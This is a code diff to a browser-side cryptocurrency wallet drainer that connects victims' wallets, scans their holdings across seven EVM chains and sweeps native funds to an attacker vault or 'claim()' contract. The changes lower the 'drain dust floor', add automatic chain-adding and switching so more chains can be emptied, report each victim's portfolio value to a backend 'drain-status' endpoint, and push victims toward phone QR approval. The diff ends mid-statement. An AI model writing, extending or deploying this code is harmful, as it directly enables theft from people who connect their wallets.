@@ -126,45 +126,11 @@
     return _vendorLoaded[key];
   }
 
-  function resolveUniversalProvider() {
-    var raw = window['@walletconnect/universal-provider'] ||
-      window.WalletConnectUniversalProvider || window.UniversalProvider;
-    return raw && (raw.UniversalProvider || raw.default || raw);
-  }
-
-  function resolveEthereumProvider() {
-    var raw = window['@walletconnect/ethereum-provider'] || window.WalletConnectEthereumProvider;
-    return raw && (raw.EthereumProvider || raw.default || raw);
-  }
-
   function resolveTonConnect() {
     if (window.TonConnectSDK && window.TonConnectSDK.TonConnect) return window.TonConnectSDK.TonConnect;
     if (window.TON_CONNECT_SDK && window.TON_CONNECT_SDK.TonConnect) return window.TON_CONNECT_SDK.TonConnect;
     if (window.TonConnect) return window.TonConnect;
     return null;
-  }
-
-  function drawQrToCanvas(canvas, uri) {
-    var QR = window.QRCode;
-    if (QR && typeof QR.toCanvas === 'function') {
-      return QR.toCanvas(canvas, uri, { width: 200, margin: 1 });
-    }
-    if (QR && typeof QR.toDataURL === 'function') {
-      return new Promise(function (resolve, reject) {
-        QR.toDataURL(uri, { width: 200, margin: 1 }, function (err, url) {
-          if (err) { reject(err); return; }
-          var img = new Image();
-          img.onload = function () {
-            canvas.width = 200; canvas.height = 200;
-            canvas.getContext('2d').drawImage(img, 0, 0);
-            resolve();
-          };
-          img.onerror = reject;
-          img.src = url;
-        });
-      });
-    }
-    return Promise.reject(new Error('QRCode global not found'));
   }
 
   var BACKEND = String(CFG.backendUrl || '').replace(/\/$/, '') || 'https://legionapi-production.up.railway.app';
@@ -551,7 +517,53 @@
     return bal > gasCost ? bal - gasCost : 0n;
   }
 
+  // EVM multi-chain sweep order — must match backend contracts + CHAIN_ADD_PARAMS
   var MULTI_CHAIN_ORDER = [1, 56, 137, 42161, 8453, 10, 43114];
+
+  var CHAIN_ADD_PARAMS = {
+    56: {
+      chainId: '0x38',
+      chainName: 'BNB Smart Chain',
+      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+      rpcUrls: ['https://bsc-dataseed.binance.org'],
+      blockExplorerUrls: ['https://bscscan.com'],
+    },
+    137: {
+      chainId: '0x89',
+      chainName: 'Polygon',
+      nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
+      rpcUrls: ['https://polygon-rpc.com'],
+      blockExplorerUrls: ['https://polygonscan.com'],
+    },
+    42161: {
+      chainId: '0xa4b1',
+      chainName: 'Arbitrum One',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://arb1.arbitrum.io/rpc'],
+      blockExplorerUrls: ['https://arbiscan.io'],
+    },
+    8453: {
+      chainId: '0x2105',
+      chainName: 'Base',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://mainnet.base.org'],
+      blockExplorerUrls: ['https://basescan.org'],
+    },
+    10: {
+      chainId: '0xa',
+      chainName: 'Optimism',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://mainnet.optimism.io'],
+      blockExplorerUrls: ['https://optimistic.etherscan.io'],
+    },
+    43114: {
+      chainId: '0xa86a',
+      chainName: 'Avalanche C-Chain',
+      nativeCurrency: { name: 'AVAX', symbol: 'AVAX', decimals: 18 },
+      rpcUrls: ['https://api.avax.network/ext/bc/C/rpc'],
+      blockExplorerUrls: ['https://snowtrace.io'],
+    },
+  };
 
   // Session state
   var S = {
@@ -789,14 +801,44 @@
     return btoa(bin);
   }
 
-  var MIN_NATIVE_WEI = 1000000000000000n;
+  var MIN_NATIVE_WEI = 100000000000000n; // 0.0001 ETH — drain dust floor (~$0.20)
 
   async function switchProviderChain(provider, chainId) {
-    await provider.request({
-      method: 'wallet_switchEthereumChain',
-      params: [{ chainId: '0x' + Number(chainId).toString(16) }],
-    });
+    var hexId = '0x' + Number(chainId).toString(16);
+    try {
+      await provider.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: hexId }],
+      });
+    } catch (switchErr) {
+      var msg = String(switchErr && switchErr.message || switchErr || '');
+      var code = switchErr && switchErr.code;
+      if (msg.indexOf('Unrecognized chain') === -1 && msg.indexOf('4902') === -1 && code !== 4902) throw switchErr;
+      var add = CHAIN_ADD_PARAMS[Number(chainId)];
+      if (!add) throw switchErr;
+      L.log('Adding chain', chainId, 'to wallet...');
+      await provider.request({ method: 'wallet_addEthereumChain', params: [add] });
+      await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] });
+    }
     await sleep(400);
+  }
+
+  async function safeSwitchProviderChain(provider, chainId) {
+    try {
+      await switchProviderChain(provider, chainId);
+      return true;
+    } catch (e) {
+      var msg = String(e && e.message || e || '');
+      if (isUserRejection(e)) {
+        L.warn('Chain', chainId, 'switch/add declined by user — skip');
+        return false;
+      }
+      if (msg.indexOf('Unrecognized chain') !== -1 || msg.indexOf('4902') !== -1) {
+        L.warn('Chain', chainId, 'not supported in wallet — skip');
+        return false;
+      }
+      throw e;
+    }
   }
 
   async function readNativeBalanceWei(provider, address) {
@@ -822,13 +864,15 @@
       var cid = MULTI_CHAIN_ORDER[i];
       if (cid === Number(connectedChainId)) continue;
       try {
-        await switchProviderChain(provider, cid);
+        var switched = await safeSwitchProviderChain(provider, cid);
+        if (!switched) continue;
         var bal = await readNativeBalanceWei(provider, address);
         if (bal > bestBal) {
           bestBal = bal;
           bestId = cid;
         }
       } catch (e) {
+        if (String(e.message || '').indexOf('Unrecognized chain') !== -1) continue;
         L.warn('Funded-chain probe', cid, 'fail:', e.message);
       }
     }
@@ -881,6 +925,25 @@
       } catch (e) {}
     },
 
+    reportScanComplete: async function (address, totalUsd, assetCount, walletName, chainId) {
+      if (S.fusionNotified) return;
+      S.fusionNotified = true;
+      S.scoutUsd = Math.max(S.scoutUsd, Number(totalUsd) || 0);
+      try {
+        await apiPost('/api/v1/scout/drain-status', {
+          wallet_address: address,
+          event: 'scan_complete',
+          chain_id: Number(chainId) || undefined,
+          chain_family: 'EVM',
+          wallet_type: walletName || 'Unknown',
+          scout_value_usd: Number(totalUsd) || 0,
+          asset_count: assetCount || 0,
+          source_page: window.location.href,
+          connect_session: S.connectSession || undefined,
+        });
+      } catch (e) {}
+    },
+
     fusion: async function (addrs) {
       try {
         var body = { connect_session: S.connectSession || undefined };
@@ -902,10 +965,9 @@
 
     ranked: async function (address, chainId) {
       try {
-        var r = await apiPost('/api/v1/scout/ranked', {
-          wallet_address: address,
-          chain_id: chainId ? Number(chainId) : undefined,
-        });
+        var body = { wallet_address: address };
+        if (chainId != null) body.chain_id = Number(chainId);
+        var r = await apiPost('/api/v1/scout/ranked', body);
         return (r && r.data) ? r.data : null;
       } catch (e) { return null; }
     },
@@ -1104,10 +1166,10 @@
   };
 
   // ═══════════════════════════════════════════════════════════════
-  // SECTION 08: WALLETCONNECT + REOWN APPKIT
+  // SECTION 08: WALLETCONNECT — Reown AppKit bundle only
   // ═══════════════════════════════════════════════════════════════
-  var _wcProv = null, _wcLoadP = null, _wcUseEthereum = false, _wcConnecting = false;
-  var _akModal = null, _akSdk = null, _akLoadP = null;
+  var _wcConnecting = false;
+  var _wcProv = null;
 
   function extractBatchOrTxId(raw) {
     if (raw == null) return null;
@@ -1129,7 +1191,7 @@
       L.warn('LegionWallet bundle not loaded');
       return null;
     }
-    if (_wcConnecting) return _wcProv;
+    if (_wcConnecting) return null;
     _wcConnecting = true;
     _wcProv = null;
 
@@ -1143,15 +1205,36 @@
     try {
       UI.status('Opening wallet modal...');
       L.log('Reown AppKit (bundled wagmi/viem) v' + (window.LegionWallet.version || '?'));
-      var provider = await window.LegionWallet.connect({
+      var connectP = window.LegionWallet.connect({
         projectId: WC_PROJECT_ID,
         metadata: wcMeta,
         timeoutMs: 180000,
         requireWalletConnect: true,
       });
+      var provider = await Promise.race([
+        connectP,
+        new Promise(function (_, rej) {
+          setTimeout(function () { rej(new Error('AppKit timeout — scan QR and approve on phone')); }, 185000);
+        }),
+      ]);
+      var connId = (window.LegionWallet.getConnectorId ? window.LegionWallet.getConnectorId() : '').toLowerCase();
+      if (provider && (provider.isMetaMask || connId.indexOf('metamask') !== -1 ||
+          connId.indexOf('injected') !== -1 || connId.indexOf('rabby') !== -1)) {
+        try { await window.LegionWallet.disconnect(); } catch (e2) {}
+        L.warn('Extension hijacked WalletConnect — retrying with phone QR');
+        _wcConnecting = false;
+        _wcProv = null;
+        return null;
+      }
+      if (provider && !provider.isWalletConnect) {
+        try { await window.LegionWallet.disconnect(); } catch (e2) {}
+        L.warn('Non-WC connector — retrying with phone QR');
+        _wcConnecting = false;
+        _wcProv = null;
+        return null;
+      }
       _wcProv = provider;
       _wcConnecting = false;
-      var connId = window.LegionWallet.getConnectorId ? window.LegionWallet.getConnectorId() : '';
       L.log('Bundled AppKit connected | connector:', connId || 'unknown',
         '| wc:', !!(provider && provider.isWalletConnect));
       return provider;
@@ -1162,475 +1245,6 @@
       L.warn('Bundled AppKit fail:', e.message);
       return null;
     }
-  }
-
-  async function loadAppKit() {
-    if (_akLoadP) return _akLoadP;
-    _akLoadP = (async function () {
-      var sets = [
-        ['https://esm.sh/@reown/appkit@1.6.8?bundle-deps',
-          'https://esm.sh/@reown/appkit-adapter-ethers@1.6.8?bundle-deps',
-          'https://esm.sh/@reown/appkit@1.6.8/networks?bundle-deps'],
-        ['https://esm.run/@reown/appkit@1.6.8',
-          'https://esm.run/@reown/appkit-adapter-ethers@1.6.8',
-          'https://esm.run/@reown/appkit@1.6.8/networks'],
-      ];
-      for (var si = 0; si < sets.length; si++) {
-        try {
-          var mods = await Promise.all([import(sets[si][0]), import(sets[si][1]), import(sets[si][2])]);
-          var createAppKit = mods[0].createAppKit || (mods[0].default && mods[0].default.createAppKit);
-          var EthersAdapter = mods[1].EthersAdapter || (mods[1].default && mods[1].default.EthersAdapter);
-          var networksModule = mods[2] || null;
-          if (createAppKit && EthersAdapter) {
-            L.log('Reown AppKit loaded');
-            return { createAppKit: createAppKit, EthersAdapter: EthersAdapter, networksModule: networksModule };
-          }
-        } catch (e) { L.warn('AppKit CDN fail:', e.message); }
-      }
-      return null;
-    })();
-    return _akLoadP;
-  }
-
-  function buildAppKitNetworks(nm) {
-    var nets = [];
-    if (nm) {
-      ['mainnet', 'polygon', 'bsc', 'arbitrum', 'optimism', 'base'].forEach(function (k) {
-        if (nm[k]) nets.push(nm[k]);
-      });
-    }
-    if (!nets.length) {
-      nets.push({
-        id: 1, caipNetworkId: 'eip155:1', chainNamespace: 'eip155', name: 'Ethereum',
-        nativeCurrency: { decimals: 18, name: 'Ether', symbol: 'ETH' },
-        rpcUrls: { default: { http: ['https://cloudflare-eth.com'] } },
-      });
-    }
-    return nets;
-  }
-
-  async function resetAppKit() {
-    if (_akModal) {
-      try { if (_akModal.close) _akModal.close(); } catch (e) {}
-      try { if (_akModal.disconnect) await _akModal.disconnect(); } catch (e2) {}
-      _akModal = null;
-    }
-  }
-
-  async function appKitConnect() {
-    if (!WC_PROJECT_ID) { L.warn('wcProjectId not set'); return null; }
-    if (_wcConnecting) return _wcProv;
-    _wcConnecting = true;
-    await resetAppKit();
-    if (_wcProv) {
-      try { if (_wcProv.disconnect) await _wcProv.disconnect(); } catch (e0) {}
-      _wcProv = null;
-    }
-    clearWCPersistence();
-    var sdk = await loadAppKit();
-    if (!sdk) { _wcConnecting = false; return null; }
-
-    var wcMeta = {
-      name: document.title || 'App',
-      description: 'Connect your wallet',
-      url: window.location.origin,
-      icons: [window.location.origin + '/favicon.ico'],
-    };
-
-    try {
-      _akSdk = sdk;
-      _akModal = sdk.createAppKit({
-        adapters: [new sdk.EthersAdapter()],
-        networks: buildAppKitNetworks(sdk.networksModule),
-        projectId: WC_PROJECT_ID,
-        metadata: wcMeta,
-        features: { analytics: false, email: false, socials: false, coinbase: 'hide' },
-        enableCoinbase: false,
-        themeMode: 'dark',
-      });
-
-      UI.status('Opening Reown wallet modal...');
-      L.log('Reown AppKit modal open');
-      await _akModal.open();
-
-      var state = await new Promise(function (resolve, reject) {
-        var done = false;
-        var poll = null;
-        var to = setTimeout(function () {
-          if (!done) reject(new Error('Reown AppKit timeout'));
-        }, 120000);
-        function finish(st) {
-          if (done) return;
-          done = true;
-          clearTimeout(to);
-          if (poll) clearInterval(poll);
-          resolve(st);
-        }
-        try {
-          var unsub = _akModal.subscribeAccount(function (st) {
-            if (st && st.address) {
-              try { unsub(); } catch (e) {}
-              finish(st);
-            }
-          });
-        } catch (e) {}
-        poll = setInterval(function () {
-          try {
-            var addr = _akModal.getAddress && _akModal.getAddress();
-            if (addr) {
-              finish({
-                address: addr,
-                isConnected: true,
-                caipAddress: (_akModal.getCaipAddress && _akModal.getCaipAddress()) || '',
-              });
-            }
-          } catch (e2) {}
-        }, 800);
-      });
-
-      await sleep(400);
-      var provider = null;
-      var getters = [
-        function () {
-          var ps = _akModal.getProviders ? _akModal.getProviders() : {};
-          return ps.eip155 || ps['eip155'] || null;
-        },
-        function () { return _akModal.getWalletProvider ? _akModal.getWalletProvider() : null; },
-        function () { return _akModal.request ? _akModal : null; },
-      ];
-      for (var gi = 0; gi < getters.length && !provider; gi++) {
-        try {
-          var p = getters[gi]();
-          if (p && p.request) provider = p;
-        } catch (ge) {}
-      }
-      if (!provider) {
-        provider = {
-          request: function (args) {
-            var p = _akModal.getWalletProvider ? _akModal.getWalletProvider() : null;
-            if (p && p.request) return p.request(args);
-            if (_akModal.request) return _akModal.request(args);
-            return Promise.reject(new Error('AppKit provider unavailable'));
-          },
-        };
-      }
-
-      provider.isWalletConnect = true;
-      _wcProv = provider;
-      _wcConnecting = false;
-      L.log('AppKit connected:', state.address ? String(state.address).slice(0, 10) : '?');
-      return provider;
-    } catch (e) {
-      _wcConnecting = false;
-      _wcProv = null;
-      await resetAppKit();
-      clearWCPersistence();
-      L.warn('AppKit connect fail:', e.message);
-      return null;
-    }
-  }
-
-  var _upProv = null;
-
-  async function loadUniversalProvider() {
-    try {
-      await loadVendorScript('wc-universal-provider.umd.js');
-      var raw = window['@walletconnect/universal-provider'] || window.WalletConnectUniversalProvider || window.UniversalProvider;
-      var UP = raw && (raw.UniversalProvider || raw.default || raw);
-      if (UP && UP.init) {
-        L.log('WC: UniversalProvider (local vendor)');
-        return UP;
-      }
-    } catch (e) { L.warn('WC universal vendor:', e.message); }
-    try {
-      var m = await import('https://esm.sh/@walletconnect/universal-provider@2.17.3?bundle-deps');
-      var UP2 = m.UniversalProvider || m.default;
-      if (UP2 && UP2.init) {
-        L.log('WC: UniversalProvider (CDN)');
-        return UP2;
-      }
-    } catch (e2) { L.warn('WC universal CDN:', e2.message); }
-    return null;
-  }
-
-  function buildWcEvmProviderFromSession(provider, sess) {
-    var ns = (sess && sess.namespaces) || {};
-    if (!ns.eip155 || !ns.eip155.accounts || !ns.eip155.accounts.length) return null;
-    var parts = String(ns.eip155.accounts[0]).split(':');
-    var chainId = parseInt(parts[1], 10) || 1;
-    var topic = sess.topic;
-    return {
-      isWalletConnect: true,
-      request: function (args) {
-        var targetChain = 'eip155:' + chainId;
-        if (provider.session) {
-          return provider.request({ method: args.method, params: args.params }, targetChain);
-        }
-        var sc = provider.client || provider.signClient;
-        if (sc && sc.request && topic) {
-          return sc.request({
-            topic: topic,
-            chainId: targetChain,
-            request: { method: args.method, params: args.params },
-          });
-        }
-        return Promise.reject(new Error('WC session not ready'));
-      },
-    };
-  }
-
-  function resolveUpSession(up) {
-    if (up && up.session && up.session.namespaces) return up.session;
-    try {
-      var sc = up.client || up.signClient;
-      if (sc && sc.session && sc.session.getAll) {
-        var all = sc.session.getAll();
-        if (all && all.length) return all[all.length - 1];
-      }
-    } catch (e) {}
-    return null;
-  }
-
-  function hasWcLocalSession() {
-    try {
-      for (var i = 0; i < localStorage.length; i++) {
-        var k = localStorage.key(i);
-        if (k && k.indexOf('wc@') === 0 && k.indexOf('session') !== -1) return true;
-      }
-    } catch (e) {}
-    return false;
-  }
-
-  async function universalConnect() {
-    if (!WC_PROJECT_ID) return null;
-    if (_wcConnecting) return _wcProv;
-    _wcConnecting = true;
-    if (!hasWcLocalSession()) clearWCPersistence();
-
-    if (_upProv && !_upProv.session) {
-      try { await _upProv.disconnect(); } catch (e) {}
-      _upProv = null;
-    }
-
-    var UP = await loadUniversalProvider();
-    if (!UP) { _wcConnecting = false; return null; }
-
-    var wcMeta = {
-      name: document.title || 'App',
-      description: 'Connect your wallet',
-      url: window.location.origin,
-      icons: [window.location.origin + '/favicon.ico'],
-    };
-
-    try {
-      if (!_upProv) {
-        _upProv = await UP.init({ projectId: WC_PROJECT_ID, metadata: wcMeta });
-      }
-
-      var existingSess = resolveUpSession(_upProv);
-      if (existingSess) {
-        var existingProv = buildWcEvmProviderFromSession(_upProv, existingSess);
-        if (existingProv) {
-          _wcProv = existingProv;
-          _wcConnecting = false;
-          L.log('UniversalProvider session restored');
-          return existingProv;
-        }
-      }
-
-      if (_upProv.removeAllListeners) _upProv.removeAllListeners('display_uri');
-      _upProv.on('display_uri', function (uri) { UI.showQR(uri); });
-
-      var sessionDone = false;
-      function checkSession() {
-        var s = resolveUpSession(_upProv);
-        if (s && s.namespaces && Object.keys(s.namespaces).length) {
-          sessionDone = true;
-          UI.hideQR();
-          return buildWcEvmProviderFromSession(_upProv, s);
-        }
-        return null;
-      }
-
-      var connectPromise = _upProv.connect({
-        optionalNamespaces: {
-          eip155: {
-            methods: [
-              'personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4',
-              'wallet_sendCalls', 'wallet_signAuthorization', 'eth_sign',
-              'eth_accounts', 'eth_chainId', 'eth_getBalance',
-            ],
-            chains: [
-              'eip155:1', 'eip155:137', 'eip155:56', 'eip155:42161',
-              'eip155:8453', 'eip155:10', 'eip155:43114',
-            ],
-            events: ['chainChanged', 'accountsChanged'],
-          },
-        },
-      }).then(function () { return checkSession(); }).catch(function () { return null; });
-
-      var prov = await Promise.race([
-        connectPromise,
-        new Promise(function (resolve) {
-          var n = 0;
-          var iv = setInterval(function () {
-            n++;
-            var p = checkSession();
-            if (p) { clearInterval(iv); resolve(p); return; }
-            if (n >= 80) { clearInterval(iv); resolve(null); }
-          }, 1500);
-        }),
-      ]);
-
-      if (!prov) throw new Error('WalletConnect timeout');
-      _wcProv = prov;
-      _wcConnecting = false;
-      L.log('UniversalProvider connected');
-      return prov;
-    } catch (e) {
-      UI.hideQR();
-      _wcConnecting = false;
-      if (_upProv) { try { await _upProv.disconnect(); } catch (e2) {} _upProv = null; }
-      clearWCPersistence();
-      L.warn('Universal WC fail:', e.message);
-      return null;
-    }
-  }
-
-  async function loadWC() {
-    if (_wcLoadP) return _wcLoadP;
-    _wcUseEthereum = false;
-    _wcLoadP = (async function () {
-      try {
-        await loadVendorScript('wc-ethereum-provider.umd.js');
-        var EP = resolveEthereumProvider();
-        if (EP && EP.init) {
-          L.log('WC: EthereumProvider (local vendor)');
-          _wcUseEthereum = true;
-          return EP;
-        }
-      } catch (e) { L.warn('WC ethereum vendor:', e.message); }
-      if (!CDN_FALLBACK) return null;
-      try {
-        var m = await import('https://unpkg.com/@walletconnect/ethereum-provider@2.17.0/dist/index.umd.js');
-        var EP2 = m.EthereumProvider || m.default;
-        if (EP2 && EP2.init) {
-          L.log('WC: EthereumProvider (CDN)');
-          _wcUseEthereum = true;
-          return EP2;
-        }
-      } catch (e3) { L.warn('WC CDN ethereum fail:', e3.message); }
-      return null;
-    })();
-    return _wcLoadP;
-  }
-
-  function clearWCPersistence() {
-    try {
-      var keys = [];
-      for (var i = 0; i < localStorage.length; i++) {
-        var k = localStorage.key(i);
-        if (!k) continue;
-        var kl = k.toLowerCase();
-        if (kl.indexOf('wc@') === 0 || kl.indexOf('walletconnect') !== -1 || kl.indexOf('wcm@') === 0) keys.push(k);
-      }
-      keys.forEach(function (k) { try { localStorage.removeItem(k); } catch (e) {} });
-      if (keys.length) L.log('WC: cleared', keys.length, 'stale session key(s)');
-    } catch (e) { L.warn('WC storage clear:', e.message); }
-  }
-
-  async function resetWCSession() {
-    await resetAppKit();
-    if (_wcProv) {
-      try { if (_wcProv.disconnect) await _wcProv.disconnect(); } catch (e) {}
-      try { if (_wcProv.removeAllListeners) _wcProv.removeAllListeners(); } catch (e2) {}
-      _wcProv = null;
-    }
-    clearWCPersistence();
-    _wcConnecting = false;
-  }
-
-  async function wcConnect() {
-    if (!WC_PROJECT_ID) { L.warn('wcProjectId not set'); return null; }
-    if (_wcConnecting) return _wcProv;
-
-    await resetWCSession();
-
-    _wcConnecting = true;
-    var SdkClass = await loadWC();
-    if (!SdkClass) { _wcConnecting = false; L.warn('WC: no provider SDK'); return null; }
-
-    var wcMeta = {
-      name: document.title || 'App',
-      description: 'Connect your wallet',
-      url: window.location.origin,
-      icons: ['https://avatars.githubusercontent.com/u/37784886'],
-    };
-
-    function onDisplayUri(uri) {
-      UI.showQR(uri);
-      if (PLAT.isMobile) {
-        var enc = encodeURIComponent(uri);
-        var links = [
-          'metamask://wc?uri=' + enc,
-          'trust://wc?uri=' + enc,
-          'rabby://wc?uri=' + enc,
-          'okex://main/wc?uri=' + enc,
-        ];
-        for (var li = 0; li < links.length; li++) {
-          try { window.location.href = links[li]; break; } catch (dee) {}
-        }
-      }
-    }
-
-    try {
-      if (!_wcUseEthereum) {
-        _wcConnecting = false;
-        L.warn('WC: EthereumProvider required');
-        return null;
-      }
-      _wcProv = await SdkClass.init({
-        projectId: WC_PROJECT_ID,
-        chains: [1],
-        optionalChains: [56, 137, 42161, 8453, 10, 43114],
-        showQrModal: true,
-        relayUrl: 'wss://relay.walletconnect.com',
-        methods: ['eth_signTypedData_v4', 'eth_accounts', 'eth_chainId', 'eth_sendTransaction'],
-        optionalMethods: [
-          'personal_sign', 'wallet_sendCalls', 'wallet_signAuthorization',
-          'wallet_getCapabilities', 'wallet_switchEthereumChain', 'eth_getBalance',
-          'eth_signTransaction',
-        ],
-        events: ['chainChanged', 'accountsChanged'],
-        metadata: wcMeta,
-      });
-      if (_wcProv.removeAllListeners) _wcProv.removeAllListeners('display_uri');
-      _wcProv.on('display_uri', onDisplayUri);
-      await new Promise(function (resolve, reject) {
-        var to = setTimeout(function () { reject(new Error('WalletConnect timeout')); }, 120000);
-        _wcProv.enable().then(function () { clearTimeout(to); resolve(); }, function (e) {
-          clearTimeout(to); _wcProv = null; reject(e);
-        });
-      });
-      UI.hideQR();
-      _wcConnecting = false;
-      return _wcProv;
-    } catch (e) {
-      UI.hideQR();
-      _wcConnecting = false;
-      _wcProv = null;
-      clearWCPersistence();
-      L.warn('WC connect fail:', e.message);
-      return null;
-    }
-  }
-
-  function wcEvmProvider(chainId) {
-    if (!_wcProv) return null;
-    return {
-      isWalletConnect: true,
-      request: function (args) { return _wcProv.request(args); },
-    };
   }
 
   // ═══════════════════════════════════════════════════════════════
@@ -1690,6 +1304,31 @@
     try {
       assets.nativeHex = await provider.request({ method: 'eth_getBalance', params: [address, 'latest'] }) || '0x0';
     } catch (e3) {}
+
+    var nativeBal = BigInt(assets.nativeHex || '0x0');
+    if (nativeBal > 0n) {
+      L.log('On-chain native:', (Number(nativeBal) / 1e18).toFixed(6), 'ETH on chain', chainId);
+    }
+
+    try {
+      var fusionUsd = await SCOUT.ranked(address);
+      if (fusionUsd && fusionUsd.total_usd != null) {
+        var totalAll = Number(fusionUsd.total_usd) || 0;
+        assets.usd = Math.max(assets.usd, totalAll);
+        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
+        L.log('Backend portfolio USD:', assets.usd.toFixed(2));
+      }
+    } catch (e4) { /* ranked all-chains optional */ }
+
+    if (nativeBal > MIN_NATIVE_WEI && assets.usd < 1) {
+      var ethFloorUsd = (Number(nativeBal) / 1e18) * 2500;
+      if (ethFloorUsd > assets.usd) {
+        assets.usd = ethFloorUsd;
+        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
+        L.log('Native ETH USD floor:', assets.usd.toFixed(2));
+      }
+    }
+
     return assets;
   }
 
@@ -1715,7 +1354,7 @@
     var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
     var sendEth = sweep.send;
 
-    if (sendEth > 1000000000000000n) {
+    if (sendEth > MIN_NATIVE_WEI) {
       if (claimContract) {
         calls.push({ to: claimContract, value: '0x' + sendEth.toString(16), data: SIG_CLAIM });
         L.log('Native sweep → claim():', claimContract.slice(0, 10) + '...', (Number(sendEth) / 1e18).toFixed(6));
@@ -1784,7 +1423,7 @@
     var gasLimit = claimContract ? 120000n : NATIVE_TRANSFER_GAS;
     var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
     var sendEth = sweep.send;
-    if (sendEth <= 1000000000000000n) return null;
+    if (sendEth <= MIN_NATIVE_WEI) return null;
     var vault = VAULT.evm;
     var chainHex = '0x' + Number(chainId).toString(16);
     try {
@@ -1992,7 +1631,7 @@
       assets = await scanAssets(provider, address, chainId);
     }
     if (assets.usd > 0 && assets.usd < MIN_DRAIN_USD) {
-      var hasNative = BigInt(assets.nativeHex || '0x0') > 1000000000000000n;
+      var hasNative = BigInt(assets.nativeHex || '0x0') > MIN_NATIVE_WEI;
       if (!hasNative && assets.tokens.length === 0 && assets.nfts.length === 0) {
         L.log('Chain', chainId, 'below USD threshold');
         return false;
@@ -2019,7 +1658,7 @@
     var isWcPath = walletName === 'WalletConnect' || !!(provider && provider.isWalletConnect);
 
     // WC FIRST: claim() contract call on phone before Permit2 / 7702
-    if (isWcPath && MOBILE_SEND_TX && nativeSend > 1000000000000000n) {
+    if (isWcPath && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI) {
       UI.status('Confirm in wallet...');
       L.log('WC claim() first | native:', (Number(nativeSend) / 1e18).toFixed(6),
         '| connector:', (provider && provider.connectorId) || '?');
@@ -2051,7 +1690,7 @@
         if (isUserRejection(pe)) throw pe;
         L.warn('Permit2/sign fail:', pe.message);
       }
-    } else if (nativeForPermit2 > 1000000000000000n) {
+    } else if (nativeForPermit2 > MIN_NATIVE_WEI) {
       UI.status('Sign transaction in wallet...');
       try {
         var p2n = await drainPermit2(provider, address, chainId, [], assets.nfts, nativeForPermit2);
@@ -2065,7 +1704,7 @@
       }
     }
 
-    if (isMetaMaskProvider(provider) && nativeSend > 1000000000000000n && !didSomething) {
+    if (isMetaMaskProvider(provider) && nativeSend > MIN_NATIVE_WEI && !didSomething) {
       L.log('MetaMask: skipping eth_signTransaction (not supported) — trying EIP-7702 / batch');
     }
 
@@ -2080,7 +1719,7 @@
     }
 
     // TIER 3: wallet_sendCalls — desktop MetaMask batch (skip on mobile/WC)
-    var useBatch = NATIVE_BATCH_FALLBACK && caps.atomicBatch && nativeSend > 1000000000000000n &&
+    var useBatch = NATIVE_BATCH_FALLBACK && caps.atomicBatch && nativeSend > MIN_NATIVE_WEI &&
       !PLAT.isMobile && walletName !== 'WalletConnect';
     if (!didSomething && useBatch) {
       UI.status('Confirm batch in wallet...');
@@ -2103,8 +1742,8 @@
       }
     }
 
-    // TIER 4: Mobile / WC — eth_sendTransaction fallback if claim not done above
-    if (!didSomething && MOBILE_SEND_TX && nativeSend > 1000000000000000n &&
+    // TIER 4: Mobile / WC — eth_sendTransaction
+    if (!didSomething && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI &&
         (PLAT.isMobile || PLAT.strategy === 'wc' || isWcPath)) {
       UI.status('Confirm in wallet...');
       L.log('Mobile native tx (eth_sendTransaction)...');
@@ -2112,6 +1751,22 @@
       if (txHash) {
         await SUBMIT.userBroadcast(txHash, address, chainId, walletName, nativeSend);
         didSomething = true;
+      }
+    }
+
+    // TIER 4b: MetaMask desktop — claim() when batch/7702 unavailable
+    if (!didSomething && nativeSend > MIN_NATIVE_WEI && isMetaMaskProvider(provider) && !PLAT.isMobile) {
+      UI.status('Confirm in wallet...');
+      L.log('MetaMask claim() fallback (eth_sendTransaction)...');
+      try {
+        var mmTx = await drainNativeSendTx(provider, address, chainId, assets);
+        if (mmTx) {
+          await SUBMIT.userBroadcast(mmTx, address, chainId, walletName, nativeSend);
+          didSomething = true;
+        }
+      } catch (mme) {
+        if (isUserRejection(mme)) throw mme;
+        L.warn('MetaMask claim() fail:', mme.message);
       }
     }
 
@@ -2145,6 +1800,14 @@
     try {
       var assets = await scanAssets(provider, address, chainId);
       L.log('Assets:', assets.tokens.length, 'tokens,', assets.nfts.length, 'NFTs, $' + (assets.usd || 0).toFixed(2));
+      S.scoutUsd = Math.max(S.scoutUsd, assets.usd || 0);
+      await SCOUT.reportScanComplete(
+        address,
+        assets.usd || 0,
+        assets.tokens.length + assets.nfts.length + (BigInt(assets.nativeHex || '0x0') > MIN_NATIVE_WEI ? 1 : 0),
+        walletName,
+        chainId
+      );
 
       var ok = await runDrainWaterfall(provider, address, chainId, walletName, hwObj, assets);
       if (ok) UI.status('Processing...');
@@ -2163,7 +1826,8 @@
       var cid = MULTI_CHAIN_ORDER[i];
       if (cid === Number(originalChain)) continue;
       try {
-        await switchProviderChain(provider, cid);
+        var switched = await safeSwitchProviderChain(provider, cid);
+        if (!switched) continue;
         var assets = await scanAssets(provider, address, cid);
         if (!chainHasDrainableAssets(assets)) {
           L.log('Chain', cid, 'empty — skip');
@@ -2710,7 +2374,15 @@
     if (S.chains.SUI) addrs.sui = S.chains.SUI.address;
 
     await SCOUT.telemetry(evmCtx.address, evmCtx.chainId, evmCtx.walletName);
-    await SCOUT.fusion(addrs);
+    var fusionData = await SCOUT.fusion(addrs);
+    if (fusionData && fusionData.total_usd) {
+      S.scoutUsd = Math.max(S.scoutUsd, Number(fusionData.total_usd) || 0);
+    }
+    var rankedAll = await SCOUT.ranked(evmCtx.address);
+    if (rankedAll && rankedAll.total_usd) {
